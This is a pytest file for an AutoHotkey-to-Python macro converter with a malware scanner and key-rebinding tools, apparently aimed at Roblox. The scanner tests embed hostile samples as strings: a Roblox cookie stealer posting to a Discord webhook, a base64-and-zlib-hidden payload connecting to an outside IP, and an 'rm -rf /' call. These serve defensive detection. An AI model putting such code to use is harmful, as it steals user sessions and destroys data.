import base64
import pathlib
import sys
import zlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))

from luger.keys import normalize_combo
from luger.sendparse import parse_send
from luger_tools import ahk2py, binds, scan

SAMPLES = pathlib.Path(__file__).parent / "samples"


# ------------------------------------------------------------ keys and send strings
def test_normalize_combo_orders_modifiers():
    assert normalize_combo("Shift+Ctrl+E") == "ctrl+shift+e"
    assert normalize_combo("LButton") == "mouse1"
    assert normalize_combo("Escape") == "esc"


def test_parse_send_spans():
    events = parse_send("e{Space 2}{Enter down}^a")
    assert [(e.action, e.key, e.count) for e in events] == [("tap", "e", 1), ("tap", "space", 2), ("down", "enter", 1), ("tap", "a", 1)]
    assert events[3].mods == ("ctrl",)
    text = "e{Space 2}"
    assert text[events[1].start:events[1].end] == "Space"


# ------------------------------------------------------------ converter
def test_v1_sample_converts_and_compiles():
    r = ahk2py.convert((SAMPLES / "v1_fisch.ahk").read_text())
    assert r["valid"], r.get("error")
    assert r["version"] == 1
    src = r["source"]
    assert "@luger.hotkey('f1')" in src
    assert "luger.every(1500, Cast)" in src
    assert "luger.cancel(Cast)" in src
    assert "luger.wait_ms(speed)" in src
    assert "luger.find_color(0xFFFFFF, (100, 100, 400, 300), 10, order='rgb')" in src
    assert "luger.key_down('w')" in src and "luger.key_up('w')" in src
    assert "if not luger.roblox_active():" in src
    assert r["unsupported"] == []


def test_v2_sample_converts_and_compiles():
    r = ahk2py.convert((SAMPLES / "v2_clicker.ahk").read_text())
    assert r["valid"], r.get("error")
    assert r["version"] == 2
    src = r["source"]
    assert "def StartClicking(*_args):" in src
    assert "ui.window('Clicker')" in src
    assert "ui.slider('Cps', 'Cps', 1, 50, default=12)" in src
    assert "on_click=StartClicking" in src
    assert "(_found1 is not None)" in src
    assert "if A_Index >= 2:" in src


def test_unsupported_lines_are_reported_not_dropped():
    r = ahk2py.convert("F1::\nRun, notepad.exe\nGoto, Somewhere\nreturn\n")
    assert r["valid"]
    reasons = [u["reason"] for u in r["unsupported"]]
    assert any("blocked" in x for x in reasons)
    assert any("Goto" in x for x in reasons)
    assert "# LUGER: not converted" in r["source"]


def test_stacked_hotkeys_and_legacy_if():
    r = ahk2py.convert("F3::\nF4::\nif count = 5\n  Send, x\ncount++\nreturn\n")
    assert r["valid"], r.get("error")
    assert "@luger.hotkey('f3')" in r["source"] and "@luger.hotkey('f4')" in r["source"]
    assert "if count == 5:" in r["source"]
    assert "count += 1" in r["source"]


def test_v1_text_deref_and_concat():
    r = ahk2py.convert('name := "Bob"\nF1::\nMsgBox, Hello %name%!\nx := "a" . name . "b"\nreturn\n')
    assert r["valid"], r.get("error")
    assert "luger.notify(luger.cat('Hello ', name, '!'))" in r["source"]
    assert "x = luger.cat('a', name, 'b')" in r["source"]


# ------------------------------------------------------------ scanner
def test_clean_macro_is_clean():
    src = "import luger\n@luger.hotkey('f1')\ndef go():\n    luger.press('e')\nluger.run()\n"
    assert scan.scan(src)["verdict"] == "clean"


def test_converted_output_is_clean():
    r = ahk2py.convert((SAMPLES / "v1_fisch.ahk").read_text())
    assert scan.scan(r["source"])["verdict"] == "clean"


def test_cookie_stealer_is_malicious():
    src = "import os, requests\np = os.getenv('LOCALAPPDATA') + '/Roblox/LocalStorage/RobloxCookies.dat'\nrequests.post('https://discord.com/api/webhooks/1/x', data=open(p).read())\n"
    result = scan.scan(src)
    assert result["verdict"] == "malicious"
    rules = {f["rule"] for f in result["findings"]}
    assert {"network", "sensitive"} <= rules


def test_hidden_base64_payload_is_found():
    payload = base64.b64encode(zlib.compress(b"import socket\nsocket.socket().connect(('1.2.3.4', 80))\n")).decode()
    src = f"import base64, zlib\nexec(zlib.decompress(base64.b64decode('{payload}')))\n"
    result = scan.scan(src)
    assert result["verdict"] == "malicious"
    assert any(f["rule"] == "hidden_code" for f in result["findings"])


def test_clean_removes_bad_lines():
    src = "import luger\nimport subprocess\nsubprocess.run(['rm', '-rf', '/'])\nluger.press('e')\n"
    cleaned = scan.clean(src)
    assert "subprocess" not in cleaned["source"]
    assert "luger.press('e')" in cleaned["source"]
    assert cleaned["verdict"] in ("clean", "suspicious")


# ------------------------------------------------------------ binds
def test_detect_and_rebind():
    src = "import luger\n@luger.hotkey('f1')\ndef go():\n    luger.press('e')\n    luger.send('e{Space}')\n"
    found = binds.detect(src)
    assert [(b["key"], b["kind"]) for b in found] == [("f1", "hotkey"), ("e", "send"), ("e", "send"), ("space", "send")]
    out = binds.rebind(src, {"key:e": "q", "key:f1": "f6"})
    assert "luger.hotkey('f6')" in out
    assert "luger.press('q')" in out
    assert "luger.send('q{Space}')" in out


def test_rebind_single_char_to_named_key_adds_braces():
    src = "import luger\nluger.send('ex')\n"
    out = binds.rebind(src, {"key:e": "enter"})
    assert "luger.send('{enter}x')" in out


def test_control_matches():
    found = binds.control_matches(binds.detect("import luger\nluger.press('e')\n"), {"interact": "e"})
    assert found[0]["controls"] == ["interact"]
